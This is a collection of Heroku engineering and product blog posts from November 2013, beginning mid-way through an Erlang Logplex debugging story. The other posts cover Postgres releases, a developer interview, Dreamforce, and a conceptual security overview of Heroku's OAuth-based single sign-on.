production, and then I waited. The problem with these settings is that failures could take up to five weeks to show up in regular nodes when we have multiple dozens of them, and then slowly ramp up in frequency. Measuring the success of the experiments I put in production took an excessively long time, during which the nodes used more CPU to do their thing. After three or four weeks without a crash, I decided to push the experiment further. I pushed the change in production to all nodes, but for these options to kick in, each node needed to be restarted. Usually we use Erlang's hot code loading features to deploy software without terminating a single connection. Instead of restarting the nodes, I waited for them to crash, which took a few weeks. Until the crash, roughly 25% of the cluster was running with the new memory allocation options, and 75% ran with the old ones. The first few nodes passed the time when issues cropped up, and seemed stable. All the new memory-related crashes were happening on the older nodes, and the now 30-35% new nodes never seemed to crash. I considered the experiment successful, while still knowing there was a non-negligible probability that age was the sole reason the older nodes, but not the new ones, kept dying. Eventually, new Erlang versions came out and I gave it a final push with a cluster roll over the course of a few hours. All production Logplex nodes are now running the newest stable Erlang version with the tweaked memory allocation settings. Problem: Solved After a few weeks (or months, depending on the age of the node verified), I found out that in practice the reduction isn't perfect; fragmentation is still occurring, but we see an improvement. Whereas most binary allocators that saw a significant amount of usage before the fixes would have usage rates between 3% and 25%, the new nodes seeing a significant amount of usage tend to have at least 35% to 40% usage, with some of them having well above 90% across the cluster. This more than doubles our efficiency in memory and usage high enough that we have yet to lose a VM without first being able to trigger a global garbage collection call. In fact, we haven't lost memory due to Out-Of-Memory errors that were directly attributable to drains and how Logplex is built. This doesn't mean the cluster components never fail anymore; I still see failures resulting from bad load-balancing between the nodes or connections and services going down that we incorrectly built around (and are now remediating). I also saw cases in which the nodes would not fail, but have degraded quality of service. The most glaring example of this was some bad behavior from some nodes under heavy load, with high drop rates in Logplex messages to be delivered to users. Nodes Are Blocking and See Poor Performance We Solve This One Nice and Easy The Structure of IO on a Node During the investigation, our routing team learned that one of the processes on the Erlang node that tended to be at risk was the user process. Erlang's IO is based around the idea of \"group leaders.\" A group leader is a process that will take charge of handling IO and forwarding it around. I already went through why this is useful for Erlang's shell to work , so I will focus on the state of affairs. Every OTP application running on the VM has an application master , a process that acts as a secret top-level supervisor for each application. On top of the VM, there's a process named user (the at-risk process) that handles all of the IO and is in charge of the standard I/O ports. In between, a varying number of processes, depending on how you're interacting with the VM, may or may not be there. Moreover, every IO call is synchronous between the IO Client (the process that calls io:format/2 ) and the IO Server (the application master, or ultimately, user ). In a default VM, logging with regular IO calls results in the following structure: or, if your commands come from the Erlang shell: For our log volume, we made the reasonable optimization of telling io:format to communicate directly with the user process (by calling io:format(user, Fmt, Args) ), which removed middlemen and allowed faster communication with less overhead. At peak times, if the VM (or the OS, given we're in the cloud) hiccuped, many connections could time out at once. And if we logged all of these events, we'd get a storm in which the individual processes would block by waiting for the confirmation of messages, which also created a memory bubble. This meant that the logging we wanted was the source of the problems we had. With more waiting, the buffers would accumulate messages in drains that couldn't be sent in time before filling up, resulting in dropped messages. Buffering Up First we replaced all of our logging calls with the lager library , which is a fantastic library that I highly recommend. The lager library uses a middleman process, but this middleman acts as a buffer on its own and allows all communication to be asynchronous, up until a certain point. Switching to lager worked well, except that on a few nodes, occassionally (and unpredictably), IO slowed to a crawl, and lager would have thousands of messages backlogged. When that happens, IO switched in synchronous mode to avoid going out of memory. This is entirely sane behavior, but for Logplex it meant that critical paths in our code (for example, the TCP Syslog drains, which should never block) would suddenly lock up, endangering the node in other ways because there was now a risk of overflowing the mailboxes of additional processes. Going synchronous simply shifted the danger around, which was trouble. I saw two options: to log less, which would temporarily solve the problem at the cost of visibility; or to try buffering and batching log messages asynchronously, which could let us keep all the logs, but wasn't sure to work. Batching has long been a recommended solution for throughput issues. Raising latency a bit leads to better resource usage by regrouping similar operations together and getting more throughput. I decided to try the buffering option because implementing it is not excessively complex, and it promised a quick fix that would be a win in terms of speed and data logged. The idea was to take all the log messages, send them to a middleman buffer process pair that would accumulate them (and optionally drop them), merge the log strings into larger pages, and send these larger pages to the user process. I would be replacing the earlier diagram describing the IO flow by: If the root cause of the problem was the message passing overhead, this solution could work. If the problem was the total bandwidth of logs Logplex was producing, little could be done to help. Problem Solved The solution worked. I promptly released the BatchIO library, which contains the buffer process pair and wraps it behind a glorified io:format/2 call. By batching operations, there's an estimated reduction in the number of messages sent across the VM for IO of as much as 75% (according to a back-of-the-envelope calculation of mine) without decreasing the amount of data logged. In case of overflow, the library will drop messages instead of blocking. So far, no messages have needed to be dropped, even though we moved to a fully asynchronous model. We've also kept lager active on the node for error logs, as opposed to the default Erlang handlers. BatchIO couldn't handle error logs; lager is better at handling error logs than the default error handlers on the node, and it will prevent overload in a better way for them. Denouement Metrics and Stuff Through this months long debugging session, the routing team has gained much higher time between individual component failures. This means fewer interruptions for us, fewer silently lost logs for our users, and additional bandwidth to let Heroku focus on more pressing non-operational issues. The improvements gleaned from this project went far further than the direct reliability of the system; additional system performance improvements came at the right time as demand increased, and the end results were satisfying. Over the course of the project, the number of log messages in transit through Logplex increased by nearly 50%, whereas the number of messages dropped was reduced by an order of magnitude during the same time period. As a result of our efforts, I also have released a few libraries to the Erlang community: Recon : Contains scripts and modules to help diagnose Erlang issues, including scripts to deal with crash dumps, memory allocation diagnostics, and other general debugging functions that can be safely used in production. BatchIO : Our IO buffering library. Although this is not as good as a full logging library, I hope it can be used as a model to help with existing logging libraries, if they were to offer alternatives to going synchronous when overloaded. POBox : A generalization of the Logplex buffers for HTTP(s) drains designed by Geoff Cant,  the technical leader of the routing team. This library is used as the core of BatchIO, and we've started using it in other internal projects that require batching or load-shedding. I still plan to work on debugging in Logplex. For example, I'm in the process of helping Logplex be more fault-tolerant to external services failure. And although overload can still take nodes down, at least it now takes more load to overload Logplex. Conclusion Every project that lives in production for a while and requires scaling up ends up having weird, complicated issues. They're issues that cannot be attributed to one root cause, are difficult to reproduce, and that nobody else in the community can encounter or solve for you. These issues crop up no matter what language, stack, framework, or hardware you have, or how correct you think your software is. These kinds of production problems are the modern version of bridges collapsing after too many people cross at once, creating heavy mechanical resonance . Although most modern bridges are able to handle these issues safely, past failures (and even newer failures ) led to safer structures. Unlike bridge design, software engineering is still a young field. Hopefully this article offers a glimpse of the daily work Heroku engineers perform, and sharing our experience will be helpful to the greater development community.", "date": "2013-11-07,"},
{"website": "Heroku", "title": "PostgreSQL 9.3 now GA on Heroku Postgres", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/postgresql_93_now_ga", "abstract": "PostgreSQL 9.3 now GA on Heroku Postgres Posted by Craig Kerstiens November 06, 2013 Listen to this article Several weeks ago we added support for Postgres 9.3 in public beta the day it was released to the community. We've had many customers use it so far and it has proven to be robust and reliable. Early adopters have started to take advantage of the great new features in this version including: New JSON functions and operators Foreign data wrappers And more Today we're excited to release Postgres 9.3 in General Availability and setting it as the default version when provisioning a new Heroku Postgres database. Defaulting to the latest version of Postgres ensures our customers can make use of the latest features and performance improvements available. If you haven’t upgraded to take advantage all the great new functionality yet then do so today and let us know how you’re using it at postgres@heroku.com . postgres", "date": "2013-11-06,"},
{"website": "Heroku", "title": "Interview with Heroku's Mattt Thompson: The Incredibly True Story of Why an iOS Developer Dropped His CS Classes and Eventually Learned How to Fly", "author": ["Sara Dornsife"], "link": "https://blog.heroku.com/mattt-thompson", "abstract": "Interview with Heroku's Mattt Thompson: The Incredibly True Story of Why an iOS Developer Dropped His CS Classes and Eventually Learned How to Fly Posted by Sara Dornsife November 12, 2013 Listen to this article Editor's note: This is a guest post from Rikki Endsley . In this exclusive interview, iOS developer Mattt Thompson opens up about the moment when he realized he'd become a programmer, why he dropped his computer science classes, and what he does AFK. Had Mattt Thompson followed in his parents' footsteps, he'd be a musician now instead of a well-known iOS developer working as the Mobile Lead at Heroku . Matthew “Mattt” Thomas Thompson was born and raised in the suburbs of Pittsburgh, Pennsylvania, by parents who are both musicians, play in the symphony, and teach music. Whereas his sister took to music growing up, Mattt kept going back to his computer. He says he couldn't help it. “I'd spend hours in Photoshop and GoLive, learning all of the tricks to making websites. These were the days before CSS, when <table> , <font> , and spacer.gif were state of the art.” Back then, he pictured himself as a designer, which is what he did for the web design company he and a developer friend started while still in high school. “Do a quick Google search, and you'll find that Matt Thompson is an extremely common name,” Mattt says. When he decided to get his own URL, Mattt wasn't surprised to discover that mattthompson.com was already registered, so the path of least resistance seemed clear—just add another “t”. Thus, Matt became Mattt and the owner of matttthompson.com . “Weird as it is, the extra 't' has become a convenient low-pass filter for people getting in touch about some opportunity or another,” Mattt says. “It's like my own personal brown M&M rider , to see if people are paying attention. I didn't intend this at first, but it's remarkable how consistently it works.” Along Came Ruby “I spent the Summer of 2005 poring through a Ruby book that I bought randomly at a bookstore liquidation,” Mattt says. And that's when his interest shifted from design to programming. By the time Mattt started his freshman year in the Carnegie Mellon Computer Science department, he was staying up late into the night focusing on his new interest. He even remembers the moment when he realized he had become a programmer, and there was nothing standing in the way of him making whatever he wanted. “All of those apps and games that I had always wanted to make were now plausible,” he recalls. Much of Mattt's early work was writing courseware, making apps for school projects, and hacking weekend projects. Although he enjoyed programming outside of class, doing it for class was different. “Computer Science classes never caught my passion like this, so I decided to drop out of the program, pursuing undergraduate degrees in Philosophy, Linguistics, and Art,” Mattt explains. “I firmly believe that those disciplines specifically, and a liberal arts education in general, provide an intellectual rigor for understanding problems on a fundamental level—something that CS alone can't begin to approach.” With a background in the web and Ruby communities, Mattt thinks programming is as much a profession as it is a passion, so developing open source software made sense. “When you make something cool, you should show it off and share it with others,” he says. “The first thing I made that got any attention was Chroma-Hash , a JavaScript visualization of password strength. That rush of hitting the top of Hacker News and attracting attention on Twitter was addictive, and it's been a contributing factor ever since.” Attention is great, but that's not what keeps Mattt involved with open source. “What really keeps me active in the community is the opportunity to make things that make the lives of others better, no matter how niche the audience or marginal the improvement,” he says. “Code costs nothing to share, creates good will, and contributes to the gift economy. What's not to like?” From Gowalla to Heroku After college, Mattt worked as a Rails developer for iKnow , a Tokyo startup, which is where he got into iOS development. As his chops in iOS programming improved, his interest in another iPhone app, Gowalla , grew, which inspired him to cold call Gowalla co-founder and CTO Scott Raymond. Mattt joined Gowalla as an iOS developer in 2010. Facebook acquired Gowalla in late 2011. “When it came time to look around for my next step, I asked myself: 'Which company is solving the most interesting problems?'” Mattt says. Heroku, which was acquired by Salesforce in 2010, had just announced the launch of its Cedar stack . Mattt thought the new launch put the company years ahead of anyone else in terms of understanding and executing the potential of cloud application platforms. “As a long-time customer myself, I had fallen in love with their design aesthetic and pragmatic approach to development, as articulated in co-founder Adam Wiggins' Twelve-Factor App manifesto,” Mattt says. So he called someone he knew at the company and asked whether Heroku wanted an iPhone developer. “When we talk about developing mobile applications,” Mattt explains, “What we're really talking about is cloud applications. Look at your phone's home screen. If you remove all of the apps that require the Internet to be useful, you're left with what? Phone? Clock? Calculator? It's an Internet connection that makes a phone smart.” Most mobile clients communicate with servers over an API, and Mattt explains that those web applications are increasingly being deployed on cloud platforms like Heroku. “Mobile is not different in this respect, of course—rich web content, built in Ember.js or Backbone.js follows this same pattern.” He says that mobile exemplifies the case for cloud technologies. “Overnight, your mobile app might go from 100 to 100k users, with a few million by the end of the week. Rather than be a victim of your own success, spending your time fighting server fires while you attempt to keep pace, Heroku takes care of this for you, and allows you to focus on developing your product to make it even better.” Since he joined Heroku, Mattt's responsibility has been to improve the Heroku mobile development experience. “Whether that meant working on open source projects like AFNetworking , Helios , Postgres.app , and Nomad ; writing mobile development articles for the Heroku Dev Center ; speaking at conferences and local meetups; helping out on support tickets; or working with Heroku Add-on Providers to deliver the essential services apps rely on,” he explains. “I became the point person for all things mobile at Heroku.” Now Mattt has a new focus. “Heroku is the best way to develop, deploy, and scale software on the internet,” he says. “Salesforce, meanwhile, is known for being the world's premiere CRM solution, but also happens to be built on top of a development platform, handling billions of requests every day.” He says there's a huge opportunity to bring the agility and flexibility of Heroku to the Salesforce platform. Mattt is working with the community to produce a set of first-party libraries for languages such as Ruby, Node.js, and Objective-C, which developers can use to interact with the Force.com APIs. He's also working with a colleague, David Dollar , on a command-line utility for Salesforce. Mattt expects the client libraries and CLI to radically improve the development experience for millions of Salesforce developers. Away From Keyboard Although Mattt is enthusiastic about programming and his role at Heroku, his time away from the keyboard is particularly interesting. “Back in May, after an exhausting month-long trip through Europe, I decided that I was tired of waiting to do all of the things that I had wanted to do,” he says, “So I started getting my pilot's license, flying Cessna 172s out of San Carlos on weekends.” He also picked up the trumpet and practices every day to get his chops ready for sitting in at jazz clubs. “I went sky diving to impress a girl, and I'm not sure if that crossed some wires in my head or what, but I've been hooked on air sports ever since, driving down to Hollister, California, to work on my hang-gliding certification.” And he likes to cook, which is why he's watched the entirety of Alton Brown's Good Eats a few times. “The perfect Sunday evening involves cooking up something new from whatever I picked up at the farmer's market, followed by a classic movie on Netflix with my girlfriend.” As passionate as he is about programming, Mattt sees a future away from it. “There's a very real chance that I'll eventually up and leave the tech world to be a pilot or flight instructor of some sort,” he admits. Dirty Details for Developers What does Mattt's workstation look like? “I keep things simple. MacBook Air and an Apple Cinema Display when I'm at the office, or just the laptop and a pair of Bose QC 15s when working from a coffee shop. Typical setup for the hipster hacker set.\" \"The main difference that throws anyone else using my computer is its Japanese keyboard layout . I switched from QWERTY when I moved to Tokyo for my first job out of college, and have been loving it ever since. It's a bit disorienting at first, but the little touches, like Caps-Lock being shoved out of the home row, an over-sized Return key, or dedicated characters for @ , ^ , and other coding essentials that make it—in my opinion—the best keyboard layout for any programmer (especially for Objective-C). Also, each key has a Hiragana character next to the English, which looks really cool.” Touch type? Or hunt and peck? “Touch Typing. Mavis Beacon would be proud.” If Mattt could contribute to another open source project, which would it be? “I'm not really all that shy or afraid to get my hands dirty, so there aren't too many projects out there that I've felt held back from contributing to. That said, I'd love to do more with Go and Rust , which both seem like great new languages.” Which project is Mattt most proud of? “ AFNetworking is by far the most substantial and popular thing I've ever made, and I take a certain amount of pride in that. I'm somebody that finds it easy to start new projects, but have difficulty following through past a certain point. So it's nice to be able to point to AFNetworking—a project I've actively maintained for the last two and a half years—as a counter-example.” How does Mattt explain to non-technical friends and relatives what he does for a living? “I have no idea. It's hard enough to get them to pronounce the name of the companies I've worked for. Seriously, Gowalla? Heroku? But honestly, saying that I work with computers is enough. I try not to talk much about work when I'm AFK.” Meet Mattt at Dreamforce If you want to meet Mattt in person, you will find him speaking in the Developer Zone at Dreamforce 2013, which will be held November 18-21 in San Francisco. First, you'll have to catch him. “Between helping out with the Developer Keynote, presenting a session about mobile development on Salesforce, and running a workshop on leveraging Heroku for Force.com, I'll be all over the place.”", "date": "2013-11-12,"},
{"website": "Heroku", "title": "Introducing Heroku Postgres 2.0", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/heroku_postgres_20", "abstract": "Introducing Heroku Postgres 2.0 Posted by Craig Kerstiens November 11, 2013 Listen to this article Today we're excited to announce an evolution of what it means to be a database as a service provider. Along with new features such as the ability to roll back your database to an arbitrary point in time and high availability, we now provide an entirely new level of operational expertise that's built right in. This new level of service allows you to feel at ease while taking advantage of your database in ways you never expected. All of this is rolled into new tiers which make it as easy as ever to choose what’s right for you. We are introducing Heroku Postgres 2.0 today, the result of these improvements. Let's dig in a little further on what's available today. Operational Expertise built-in As the number of databases we run continues to grow we’re seeing people take advantage of their database in new and exciting ways daily. At the same time we’ve continued to see a key need for better management of the day to day ins and outs involved with using a database. With Heroku Postgres this is now delivered to you in a way like never before. Here’s just a few ways you’ll begin to experience this as a customer: If you have indexes that are not needed and slowing down write throughput on your database, we’ll notify you so you can easily make the choice to remove them. If you have accumulated bloat in your data or indexes, we'll notify you so that you can act on it accordingly. If critical security incidents arise around your database we’ll make sure its patched without you lifting a finger. If underlying disks get corrupted, with mechanisms already in place we’ll dig in to get you back up and running as safely as possible for your data. And this is just the start. Stay tuned for more improvements in this area as we iterate further based on your feedback. Rollback In a world of agility where we bring applications to market soon and constantly iterate, there's undeniable risk for things going wrong as we deploy to production leading to data loss or inconsistencies. Even with robust testing, having a safety net available to minimize the risk you’re exposed to is still critical, as these inconsistencies can render one of your businesses' most precious assets useless: your data. Heroku Postgres forks allow you to even test a data migration on a production-like environment with no impact on production, but some bugs are difficult to anticipate and can cause data problems over time. For years Heroku has had the ability to undo a deploy trivial with the rollback command. Just as we brought the ability to fork and follow your database over from git, we’re drawing inspiration from the Heroku platform' rollback, now available for your database . This means should you run a bad migration that drops a table, or have a need to do some historical forensics with a view of your data as of some time in the past you’re now able to, all with a single command. High availability Keeping your data safe and secure is a must do for any database-as-a-service provider, yet at the same time your database is still no use to you when it's down. With our introduction of followers we saw many of our customers using them to improve the uptime of their applications by manually unfollowing and promoting them when primary databases failed. We continued to build on the foundations of this, and available today is built in HA on our new Premium and Enterprise tiers. New Tiers and Pricing With the addition of fork and follow you had the ability better control your uptime, your read scaling, and how you worked with your data. While you can still be flexible in working with your data we’re making it easy for you to make the right choice when it comes to your database availability needs. Our new tiers make it easy to decide what is right for your business, all tiers already offer continuous protection for your data ensuring its safe, the biggest difference now when choosing is the uptime you should expect on each tier. While we strive for higher uptime for all of our tiers, mechanisms in place for Premium and Enterprise are meant for where uptime for your app is critical. Here’s a clearer look at what each tier provides: Tier Downtime Tolerance Backups Available Fork Follow Rollback HA SLA Hobby Up to 4 hrs downtime per mo. Yes No No No No No Standard Up to 1 hr downtime per mo. Yes Yes Yes 1 hour No No Premium Up to 15 min downtime per mo. Yes Yes Yes 1 week Yes No Enterprise Up to 15 min downtime per mo. Yes Yes Yes 1 month Yes Yes For those already familiar with our pricing our new standard tier is very similar to our now legacy production tier. For some of you this means migrating could actually provide over 45% in cost savings on your production database. For full details on pricing visit our pricing page to explore further. Availability Heroku Postgres 2.0 is available today for all Heroku customers, and is available for PostgreSQL 9.3 databases. If you’re already running a PostgreSQL 9.3 database on us today you can move to a new tier by creating a follower and conducting a fast changeover to your new tier . If you’re not running PostgreSQL 9.3, you can upgrade your database with pgbackups . Finally, for those where uptime is critical and your data size is prohibitive for an upgrade with pgbackups, we will be reaching out directly around upgrade paths that address this. postgres", "date": "2013-11-11,"},
{"website": "Heroku", "title": "OAuth as Single Sign On", "author": ["Tom Maher"], "link": "https://blog.heroku.com/oauth-sso", "abstract": "OAuth as Single Sign On Posted by Tom Maher November 13, 2013 Listen to this article Today, we're announcing the release of a key part of our\nauthentication infrastructure - id.heroku.com - under the MIT license.\nThis is the service that accepts passwords on login and manages all\nthings OAuth for our API.  The repo is now world-readable at https://github.com/heroku/identity .  Pull requests welcome. While OAuth was originally designed to allow service providers to\ndelegate some access on behalf of a customer to a third party, and we\ndo use it that way too, Heroku also uses OAuth for SSO.  We'd like to\ntake this opportunity to provide a technical overview. A quick bit of terminology We use the term \"properties\" to refer to public-facing sites owned and\noperated by Heroku.  See our post on Fancy Pants SSL Certificates on how to identify a Heroku property.  As a concrete example of a property in this document, I use addons.heroku.com. When a server makes some form of API call to another server, and is doing so in response to a browser request, this server-to-server request is a \"backpost\".  An example is popular cat-picture-injecting service Meowbify .  Requests to http://cats.www.heroku.com.meowbify.com/ result in Meowbify making a backpost to www.heroku.com . The colloquial term \"OAuth Dance\" refers to the sequence of browser redirects which communicate an OAuth authorization code from service provider to consumer.  It should also be read to include the backpost from consumer to provider that exchanges the code for an access & refresh token. Single Sign On When you click \"login\" on addons.heroku.com, you've probably noticed you get redirected to id.heroku.com.  This creates a longer-lived cookie on id.heroku.com, and kicks off an OAuth dance with addons.heroku.com. If you log in to dashboard.heroku.com first, you'll also notice you can go to addons.heroku.com, click \"login\", and it'll also trigger an OAuth dance with addons rather than prompt you again for your password. Our internal use of OAuth for SSO is necessary in part due to legacy concerns.  For most of our history, Heroku's Aspen and Bamboo stacks served customer applications out of the *.heroku.com domain, the same domain we use ourselves for all public-facing Heroku properties like www.heroku.com and dashboard.heroku.com.  This significantly complicates our use of cookie-based authentication, as discussed in [1] .  While we have retired Aspen and disabled the creation of new Bamboo applications, existing Bamboo apps continue to pose cookie-stuffing concerns and curtail our use of domain-wide cookies for any sensitive information. This brings us to our first debatable deviation from the spec: pre-approval.  A normal OAuth flow requires the customer be prompted to approve or deny the grant to an OAuth consumer.  All Heroku properties are allowlisted to suppress this prompt, and implicitly grant.  Additions to the list are tightly controlled, and strictly limited to our own properties.  The rationale is that asking a customer to approve each individual property is a bit silly, since there is no third party. When addons completes the OAuth dance, the refresh token is immediately discarded.  The access token is then saved in the _heroku_addons_session cookie.  The payload is encrypted with AES-256-CBC, random IV.  The ciphertext is then HMAC'd with SHA256 for tamper protection.  Secrets are held only by the addons app itself.  Also present in the payload is a timestamp, telling addons to expire the cookie in six hours.  All interactions between addons and our main API server are authenticated using that access token.  For example, if you use addons.heroku.com to add Redis To Go or New Relic to your app, that results in addons.heroku.com decrypting your session cookie (after verification of the HMAC tag), extracting the OAuth access token, and making a backpost to api.heroku.com to execute the change.  We use this same \"save token in encrypted cookie\" approach across all Heroku properties that require API access. Yo dawg, I heard you like oauth... It's worth noting that identity itself also follows this access-token-in-session-cookie approach.  Identity itself is \"just\" an OAuth consumer, albeit one that takes passwords.  Due to the complexities of OAuth, we've split it off from the \"real\" service provider - api.heroku.com.  Identity does not retain refresh or access tokens in a server-side database - those are held only by API.  It does have two super-powers, though.  Identity can manage OAuth grants and revocations on behalf of a user, but all such management requires the user's OAuth access token (again: that lives in the user's session cookie).  It can also request and receive access tokens with an exceptionally long lifespan - up to 30 days.  This extended lifespan allows the user to remain logged in for an extended period without the need to store or retain a never-expiring refresh token. The other SSO As you can imagine, all this introduces a single-sign-OUT problem.  If I log in to dashboard, then visit addons, I now have two encrypted cookies with OAuth tokens in them, plus a third for Identity itself. If I click \"logout\" on dashboard, my expectation as a user is that this logs me out of all Heroku properties.  For the most part, that's true.  Regardless of what site you're logged in to, clicking logout results in the revocation of both your cookie based session and its OAuth token on id.heroku.com. This is our second spec deviation: on logout, Identity has API revoke the OAuth access tokens of all Heroku properties that were issued for that browser.  This revocation happens server-side, which prevents any long redirect chains that the browser must follow (e.g., google.com's redirect to youtube.com on login/logout).  The encrypted access tokens of course remains present in the session cookies of addons and other properties.  The next time addons receives a request with this now-stale cookie that requires communicating with API, API will 403 the revoked token, which addons interprets as a logout.  The customer is then thrown back into an OAuth dance with identity, and must retry the request.  Currently, this \"revoke the access tokens on logout\" behavior is limited to Heroku properties, and is not publicly available. However, replaying an old/stolen cookie against an addons URL that does not perform a backpost to API, you still appear to be logged in.  The most interesting case for addons is that this can be done to get a list of your applications.  What's going on?  For performance reasons, addons.heroku.com uses memcache to cache the list of applications owned by a user.  The network round-trip to memcache is much faster than the roundtrip to API, plus a call to API's database.  However, that means changes on API aren't immediately reflected on addons. Because the goal of the cache is to avoid an API call, that means not every URL on addons does a call to API, and addons doesn't properly realize the cookie has a dead access token until it actually makes an API call.  The result is that it's possible to appear still logged in to addons, even after you log out. Here's a hint Having to retry a request is a horrible user experience.  To minimize that, we give properties a \"hint\" as to whether a user has logged out.  On login, identity issues a second cookie, scoped to *.heroku.com, called heroku_session_nonce .  As the name indicates it contains a random nonce .  The session nonce is reset on logout.  All Heroku properties, when completing their OAuth dance, observe the current heroku_session_nonce value and save it in their private session cookie.  On all subsequent authenticated requests, the private nonce is compared with the domain-global heroku_session_nonce cookie.  A mismatch is treated as an authentication failure, and the browser is redirected to id.heroku.com to do a fresh oauth dance.  The use of a domain-global cookie to indicate logout allows us to avoid any additional database roundtrips, and lets us avoid forcing a backpost to API on every request to every property. But wait, I said at the start we're not using a global cookie because of our legacy of Bamboo, and untrusted people having access to all such cookies.  Doesn't heroku_session_nonce suffer from the same problem?  Of course it does!  Controlling a user's nonce cookie has two noteworthy security implications: Denial-of-Service: An attacker able to coerce a victim into visiting\na site under their control can use a malicious Bamboo app to\ncontinuously delete or overwrite the nonce with gibberish.  This can\nforcibly log out the victim, making it difficult to interact with\nHeroku.  While this is undesirable, we've decided it's an acceptable\nrisk given the complexity of any other solution. Session Fixation (kinda-sorta): An attacker who observes a victim's\nnonce can set a tracking cookie on the browser to uniquely identify\nthe victim.  When the nonce changes (i.e., on logout), the attacker\ncan continuously re-set the nonce to the old value.  This would\nresult in addons and other properties believing that, until the\nproperty's session cookie expires, the victim is still logged in.\nWithout the presence of an XSS or similar vuln, however, the\nattacker is unable to leverage this further.  In the shared-browser\nthreat model (e.g., internet cafes in developing regions), this\nbecomes slightly more interesting.  However, a plethora of more\nserious attacks come into play in that case, such as keystroke\nlogging.  Given that, and the lack of a useful attack, we are again\nOK with this risk. We realize this is still sub-optimal, and certainly aesthetically displeasing to security folks.  An elegant, performant, provably secure solution to handling distributed cache invalidation is a special case of one of the two hard problems in computer science [2] .  If you're able to solve it, you'll probably get a Turing Award , our field's closest thing to a Nobel Prize.  Until this happens, we're stuck with a series of workarounds and complex interactions as I describe above. Isn't this confidential???  What if there's a security vulnerability? Heroku would not exist without open source.  Other security sensitive open source software we use include \"Rails\" and \"The Linux Kernel\". While we use GitHub's issue tracker extensively, as always we ask security researchers submit vulnerability reports to security@heroku.com .  The Security Team's PGP key is available in our vulnerability reporting guidelines . Vulns like this? https://github.com/heroku/identity/pull/49 - we had a CSRF issue in the approve/deny page.  This was originally reported to us from an independent security researcher.  It's a good example of some ambiguity in the OAuth spec.  From RFC 6749, sec 3.1 : The authorization server MUST support the use of the HTTP \"GET\"\nmethod [RFC2616] for the authorization endpoint and MAY support the\nuse of the \"POST\" method as well. There's two ways to read this: The OAuth consumer redirects the end user to identity to start the dance, and should be able to use an HTTP 302 temporary redirect to do so.  Browsers do a GET for all 301 and 302's, so the identity needs to accept a GET to display the approve/deny page. By \"endpoint\", they mean the state-changing URL that the browser posts to when the end user pushes the \"Approve\" button.  Normally, since this is a state-changing action, you'd only use POST (or arguably, PUT).  But, the spec says supporting GET is an RFC MUST , so GET it is. As you can imagine, an extra line in the spec to differentiate what \"endpoint\" it means would go a long way. In closing Given our limited resources, the low impact of the information available to an attacker, the compensating measure of the six-hour cookie lifetime, and the high difficulty of being able to execute an attack like this without also being able to gain greater access to a victim's computer that would result in more rewarding attacks (e.g., a keystroke logger to capture the user's password), we are comfortable releasing identity.  As we continue to build and improve Heroku as a platform, we are constantly looking for how to incorporate security needs into our underlying architecture. If you have any feedback or suggestions on this, we would be delighted to hear them.  We have considered the \"obvious\" solution of having API do a callback to all properties to notify them to do any logout-related cleanup (i.e., flush their caches).  We haven't gone down that path yet because this would be a moderately large endeavor, and something that should really be handled in the OAuth protocol specification itself.  Because it's not complicated enough, you see. Acknowledgments While our adoption of OAuth for SSO was a major team-spanning effort, identity was principally written by my colleague Brandur Leach .  All thanks go to him, but any factual errors here are mine alone. Heroku Security Hall-of-Famer Tejash Patel's report to us in July 2013 was the impetus behind this blog post and the open-sourcing of identity. The key idea of decentralizing credentials out to the browser, and thus making id.heroku.com a less tempting target, originally came from Scott Renfro, my former coworker and mentor in paranoia. Notes \"Origin Cookies: Session Integrity for Web Applications\", Web 2.0 Security and Privacy Workshop, 2011.  A. Bortz, A. Barth, A. Czeskis. http://w2spconf.com/2011/papers/session-integrity.pdf \"There are only two hard problems in computer science: cache invalidation, naming things, and off-by-one errors.\" -Paraphrase of saying generally attributed to the late Phil Karlton . -Tom Maher Heroku Security Team", "date": "2013-11-13,"},
{"website": "Heroku", "title": "Heroku at Dreamforce - Nov 18 - 21", "author": ["Sara Dornsife"], "link": "https://blog.heroku.com/heroku_dreamforce", "abstract": "Heroku at Dreamforce - Nov 18 - 21 Posted by Sara Dornsife November 15, 2013 Listen to this article It’s hard to believe the scale or imagine the energy that is Dreamforce . As part of the Salesforce Platform, a platform with a growing developer community and an amazing range of technologies, Heroku will join the party November 18-21 in San Francisco. This is a big deal for us. DevZone A few weeks ago we announced the Salesforce $1 Million Hackathon . By the way, that’s $1 million cash, the single largest hackathon prize in history. The response from our developer community has been fantastic – the winning app will be undoubtedly amazing. Heroku will also be a big part of developer workshops, the genius bar, several demo stations and a whole list of sessions. Extra bonus, the DevZone includes an area dedicated to the Internet of Things. We won't give away all the details, but the Salesforce Platform is pretty excited to have joined forces with connected product gurus, Xively , and long-time Heroku partner Ionia , to create a connected vintage pinball arcade. Locks have been picked, sensors installed…Death Star ready for battle. Heroku Sessions There are over 1,250 sessions across the full event. Here are a few worthy session highlights: - Application Security: Secure Heroku Apps with HP Fortify on Demand Along with the release of their Heroku add-on, the HP Fortify on Demand team will walk developers through their trusted security monitoring cloud service. - Using Heroku Postgres to Manage Your Salesforce Data On the heels of the Heroku Postgres 2.0 release, we'll show developers how to leverage Heroku Postgres to bring new data management capabilities to Salesforce Platform integrations. - 5 Ways Connected Products Will Transform Your Business We've engineered a very cool connected product to demonstrate just why companies need to become connected companies. Dreamforce is going to be a great show, hope to see you there.", "date": "2013-11-15,"},
{"website": "Heroku", "title": "Welcome to the Community", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/welcome_to_the_community", "abstract": "Welcome to the Community Posted by Craig Kerstiens November 14, 2013 Listen to this article At Heroku we have long considered PostgreSQL to be a powerful and reliable open-source database for keeping data safe and accessible for serious applications with demanding workflows and use cases. Over the years we’ve invested heavily in continuing to improve it , whether it’s by employing Postgres major contibutors , employing driver maintainers , funding core development, or being part of language communites such as Ruby and Python to help spread the good news that is Postgres. It’s that interaction with the developer and database communities that help us inform and influence the future of Postgres. This work over the years has continued to advance Postgres to be a better database for all and even  expand it beyond its relational roots . It's been a great database for us to build our offering on and has enabled us to continue to add further value such as our new operational expertise that's built right in or dataclips . It’s both this great database as well as the additional value that’s allowed us to see the great growth we’ve seen today, now running a fleet of over 750,000 Postgres databases. All PostgreSQL users, hackers and service providers reap the benefits of any and all improvements to the project. It’s with that in mind that we welcome Amazon to this community and look forward to their contributions and collaboration to help further the PostgreSQL project. postgres", "date": "2013-11-14,"},
